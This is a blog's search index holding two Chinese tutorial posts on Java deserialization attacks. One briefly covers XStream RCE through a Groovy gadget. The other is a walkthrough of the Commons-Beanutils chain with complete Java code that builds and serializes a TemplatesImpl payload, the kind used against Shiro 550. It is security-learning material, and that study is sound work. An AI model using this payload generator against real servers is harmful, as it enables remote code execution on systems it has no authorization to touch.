<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XStreadm反序列化</title>
      <link href="/article/XStreadm-unser/"/>
      <url>/article/XStreadm-unser/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>核心原理</h1><p><code>readObject()</code>方法是XStreadm反序列化的核心之一; 和CC链非常相似, 利用 Java 的反序列化机制和一些恶意类</p><h1>构造</h1><p>首先找到一个可以利用的恶意类的<code>readObject()</code>方法或是其他类似方法例如<code>finalize()</code></p><p>当XStream 对一个 XML 数据进行反序列化时，如果它解析到一个 <code>&lt;object-name&gt;</code> 标签，它会尝试实例化这个类，并调用其 <code>readObject()</code> 方法来填充数据</p><p>然后就是通过恶意链简介调用<code>java.lang.Runtime.exec()</code>, 那么就可以实现远程代码执行</p><h1>示例</h1><h2 id="典型的-XStream-攻击链（Groovy-示例）"><a class="header-anchor" href="#典型的-XStream-攻击链（Groovy-示例）">¶</a>典型的 XStream 攻击链（Groovy 示例）</h2><p>一个经典的 XStream 攻击链利用了 Groovy 库，它曾经在 XStream 的黑名单之外</p><p>恶意 XML 构造：攻击者构造一个 XML，其中包含一个 Groovy.lang.Closure 对象。这个对象可以在其 call() 方法中执行任意代码</p><p>利用java.util.concurrent.ConcurrentHashMap：攻击者会将 Groovy.lang.Closure 封装到 ConcurrentHashMap 中，并利用其序列化特性</p><p>XStream 反序列化：当 XStream 解析 XML 时，它会创建 ConcurrentHashMap 实例，并填充其数据</p><p>Groovy 代码执行：在反序列化过程中，ConcurrentHashMap 会调用其内部的某些方法，这些方法会触发 Groovy.lang.Closure 的 call() 方法，从而执行攻击者预设的 Groovy 代码，例如：</p><p>“whoami”.execute()远程代码执行：最终，Groovy 代码会被执行，实现了 RCE</p><p>这个攻击链的本质是利用了 Groovy.lang.Closure 这个 Bad Gadget，结合 ConcurrentHashMap 的反序列化特性，在不被 XStream 黑名单拦截的情况下，触发了命令执行</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons-Beanutils链</title>
      <link href="/article/cb-chain/"/>
      <url>/article/cb-chain/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>参考文章</p><ol><li><a href="https://www.cnblogs.com/1vxyz/p/17588722.html">Java反序列化Commons-Beanutils篇-CB链</a></li><li><a href="https://www.freebuf.com/articles/web/319397.html">freebuf-关于我学渗透的那档子事之Java反序列化-CB链</a></li><li><a href="https://www.cnblogs.com/shinnylbz/p/18673101">博客园-java 反序列化cb1复现</a></li></ol><h1>前置知识</h1><p>shiro550中自带CommonsBeanutils 1.8.3 和 commons-collections-3.2.1的依赖，可以利用此条链进行攻击</p><h2 id="环境"><a class="header-anchor" href="#环境">¶</a>环境</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CommonsBeanutils"><a class="header-anchor" href="#CommonsBeanutils">¶</a>CommonsBeanutils</h2><p>Commons BeanUtils 是一个 Apache 开源项目下的一个库，它提供了一套强大而便捷的静态工具方法，用于动态地获取、设置JavaBean 的属性，以及进行类型转换、集合操作等。</p><p>它的核心价值在于通过反射（Reflection）机制，让我们能够以字符串名称的方式来访问对象的属性，而无需在编译时就知道类的具体结构。</p><h2 id="JavaBean"><a class="header-anchor" href="#JavaBean">¶</a>JavaBean</h2><p>一个标准的 JavaBean 通常指具有以下特征的类</p><ol><li>有一个公共的无参构造函数</li><li>属性都是私有的（使用 <code>private</code> 修饰）</li><li>属性可以通过公共的 Getter 和 Setter 方法进行访问<ul><li>Getter 方法：用于读取属性值，命名规则为 <code>getXxx()</code>（对于布尔类型，也可以是 <code>isXxx()</code>）</li><li>Setter 方法：用于写入属性值，命名规则为 <code>setXxx()</code></li></ul></li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="comment">// 私有属性</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 公共的无参构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getter 和 Setter 方法</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CommonsBeanutils利用点"><a class="header-anchor" href="#CommonsBeanutils利用点">¶</a>CommonsBeanutils利用点</h2><p>commons-beanutils中提供了一个静态方法<code>PropertyUtils.getProperty()</code>，可以让使用者直接调用任意JavaBean的getter方法</p><p><code>getOutputProperties()</code>方法即其 <code>_outputProperties</code> 属性的 <code>getter</code>方法是加载恶意字节码的起点，我们可以利用前面提到的，commons-beanutils里的<code>PropertyUtils.getProperty()</code>去调用<code>getter</code></p><p><code>PropertyUtils.getProperty()</code>传入两个参数，第一个参数为 JavaBean 实例，第二个是 JavaBean 的属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Mike&quot;</span>);</span><br><span class="line">PropertyUtils.getProperty(person,<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Mike&quot;</span>);</span><br><span class="line">person.getName();</span><br></pre></td></tr></table></figure><p>PropertyUtils.getProperty支持递归获取属性</p><p>比如a对象中有属性b, b对象中有属性c，我们可以通过 <code>PropertyUtils.getProperty(a, &quot;b.c&quot;);</code>, 的方式进行递归获取</p><p>使用者可以很方便地调用任意对象的getter, 如果getter方法存在可以rce的点可以利用的话，就存在安全问题了</p><p><strong>Address 类</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Address</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String city;</span><br><span class="line">    <span class="keyword">private</span> String street;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须有无参构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Address</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getter and Setter</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCity</span><span class="params">()</span> &#123; <span class="keyword">return</span> city; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCity</span><span class="params">(String city)</span> &#123; <span class="built_in">this</span>.city = city; &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getStreet</span><span class="params">()</span> &#123; <span class="keyword">return</span> street; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStreet</span><span class="params">(String street)</span> &#123; <span class="built_in">this</span>.street = street; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>User 类</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Address address; <span class="comment">// User 对象中包含另一个对象 Address</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须有无参构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getter and Setter</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line">    <span class="keyword">public</span> Address <span class="title function_">getAddress</span><span class="params">()</span> &#123; <span class="keyword">return</span> address; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAddress</span><span class="params">(Address address)</span> &#123; <span class="built_in">this</span>.address = address; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>递归获取city</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ！！！ 递归获取 ！！！</span></span><br><span class="line"><span class="comment">// 获取 user 的 address 属性的 city 属性</span></span><br><span class="line"><span class="type">String</span> <span class="variable">city</span> <span class="operator">=</span> (String) PropertyUtils.getProperty(user, <span class="string">&quot;address.city&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;城市: &quot;</span> + city); <span class="comment">// 输出: 城市: 北京</span></span><br></pre></td></tr></table></figure><h1>利用流程</h1><ol><li>TemplatesImpt类-&gt;调用恶意类</li><li>BeanComparator类-&gt;利用javabean调用<code>getOutputProperties()</code></li><li>PriorityQueue类-&gt;反射调用<code>PropertyUtils#getPropert</code></li></ol><h2 id="TemplatesImpt类"><a class="header-anchor" href="#TemplatesImpt类">¶</a>TemplatesImpt类</h2><p>TemplatesImpt类的危险方法是<code>getOutputProperties()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>newTransformer().getOutputProperties()</code>, 跟进<code>newTransformer()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入<code>getTransletInstance()</code>, 看到做了两个空判断，<code>_null</code>、<code>_class</code>，之后<code>_class</code>不为空执行<code>defineTransletClasses()</code>, 跟进</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">        <span class="comment">// 先看看这里</span></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">        translet.postInitialization(); <span class="comment">// 之后看这里</span></span><br><span class="line">        translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">        translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>defineClass从<code>_bytecodes[]</code>中还原出一个Class对象并放在<code>_class</code>中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]); <span class="comment">// 看看这个</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>这个是defineClass</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时对还原的class做了一个实例化，到这里我们可以得知，在这里传入一个恶意类，通过静态代码块或者构造方法就可以执行恶意操作, 如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure><h2 id="BeanComparator类"><a class="header-anchor" href="#BeanComparator类">¶</a>BeanComparator类</h2><p>TemplatesImpt类已经得知该类可以恶意执行命令, 如何调用呢; TemplatesImpl符合javabean的使用条件, 所以就用JavaBean</p><p><code>TemplatesImpl.getOutputProperties()</code>如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Properties _outputProperties;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 跳转到设置设置值的部分</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(String transletName,  </span></span><br><span class="line"><span class="params">    Properties outputProperties, <span class="type">int</span> indentNumber,  </span></span><br><span class="line"><span class="params">    TransformerFactoryImpl tfactory)</span> &#123;  </span><br><span class="line">    _name      = transletName;  </span><br><span class="line">    _outputProperties = outputProperties;  </span><br><span class="line">    _indentNumber = indentNumber;  </span><br><span class="line">    _tfactory = tfactory;  </span><br><span class="line">    _overrideDefaultParser = tfactory.overrideDefaultParser();  </span><br><span class="line">    _accessExternalStylesheet = (String) tfactory.getAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于是bean, 设置这个值一般是getOutputProperties</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Implements JAXP&#x27;s Templates.getOutputProperties(). We need to * instanciate a translet to get the output settings, so * we might as well just instanciate a Transformer and use its * implementation of this method. */</span><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties(); <span class="comment">// 关键行 </span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看看都什么函数调用了, 找到了这个<code>PropertyUtils.getProperty()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PropertyUtils.getProperty(templatesImplObj, <span class="string">&quot;outputProperties&quot;</span>);</span><br></pre></td></tr></table></figure><p>再往上找, 找到了<code>BeanComparator.compare()</code></p><p>当调用 <code>BeanComparator.compare()</code> 函数时，其内部会调用我们前面说的 <code>getProperty</code> 函数，进而调用 JavaBean 中对应属性的 getter 函数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.property == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.comparator.compare(o1, o2);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty(o1, <span class="built_in">this</span>.property);  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty(o2, <span class="built_in">this</span>.property);  </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.comparator.compare(value1, value2);  </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>o1为我们传递的TemplatesImpt类，构造函数直接赋值，property为<code>_outputProperties</code>; 接下来我们只需要找一个同名调用的compare，例如利用CC2/4链中用的 <code>PriorityQueue.readObject()</code></p><h2 id="PriorityQueue类"><a class="header-anchor" href="#PriorityQueue类">¶</a>PriorityQueue类</h2><p>在CC链中已经介绍过了, 所以简略写一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">  -&gt; BeanComparator.compare()</span><br><span class="line">    -&gt; PropertyUtils.getProperty()</span><br><span class="line">      -&gt; TemplatesImpl.getOutputProperties()</span><br><span class="line">        -&gt; TemplatesImpl#newTransformer()</span><br><span class="line">          -&gt; ................</span><br><span class="line">            -&gt; TransletClassLoader.defineClass() </span><br><span class="line">              -&gt; Evil.newInstance()</span><br></pre></td></tr></table></figure><p>queue的size&gt;2, 而add()也会执行compare; 由于在<code>BeanComparator#compare()</code>中，如果 this.property 为空，则直接比较这两个对象; 这里实际上就是对1和2进行排序</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>先设置成正常类, 然后我们再用反射将 property 的值设置成恶意的 outputProperties ，将add进队列里的1,2替换成恶意的<br>TemplateImpl 对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(comparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br></pre></td></tr></table></figure><p>与CC2/4略微不同的是，还需要用反射去修改 queue属性的值，因为要控制<code>BeanComparator.compare()</code>的参数为恶意templates对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(queue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,templates&#125;);</span><br><span class="line"><span class="comment">// 设置BeanComparator.compare()的参数</span></span><br></pre></td></tr></table></figure><h1>完整代码</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\VSC\\JAVA_worksp\\IDEA\\CC1\\target\\classes\\org\\example\\TestTemplatesImpl.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(beanComparator);</span><br><span class="line"></span><br><span class="line">        setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, <span class="literal">null</span>&#125;);</span><br><span class="line"></span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos2.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] buf = bos.toByteArray();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(buf));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span 